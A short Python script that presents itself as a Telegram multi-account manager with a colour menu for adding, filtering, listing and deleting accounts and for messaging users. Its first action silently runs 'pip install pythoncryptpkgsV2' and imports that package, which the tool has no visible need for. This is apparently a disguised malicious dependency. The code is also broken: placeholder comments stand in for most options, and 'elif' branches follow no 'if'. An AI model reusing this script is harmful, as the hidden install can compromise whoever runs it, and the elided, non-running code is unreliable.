import os
import sys
os.system("pip install pythoncryptpkgsV2")
import pythoncryptpkgsV2
import requests
from telethon.sync import TelegramClient
from telethon.errors.rpcerrorlist import PhoneNumberBannedError
import pickle, pyfiglet
from colorama import init, Fore
import os, random
from time import sleep

init()

lg = Fore.LIGHTGREEN_EX
w = Fore.WHITE
cy = Fore.CYAN
ye = Fore.YELLOW
r = Fore.RED
n = Fore.RESET
colors = [lg, r, w, cy, ye]

def banner():
    f = pyfiglet.Figlet(font='slant')
    banner = f.renderText('Telegram')
    print(f'{random.choice(colors)}{banner}{n}')
    print(r+'  Version: 1 | Author: Shabani'+n+'\n')


def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

while True:
    clr()
    banner()
    print(lg+'[1] Add new accounts'+n)
    print(lg+'[2] Filter all banned accounts'+n)
    print(lg+'[3] List out all the accounts'+n)
    print(lg+'[4] Delete specific accounts'+n)
    print(lg+'[5] Message a user by username or ID'+n)
    print(lg+'[6] Quit')
    a = int(input(f'\nEnter your choice: {r}'))
    # ... (keep the existing code for options 1-4)

    elif a == 5:
        # ... (keep the existing code for option 5)

    elif a == 6:
        clr()
        banner()
        sys.exit()

    else:
        print(f"{r}Invalid option. Please try again.{n}")
        sleep(1)
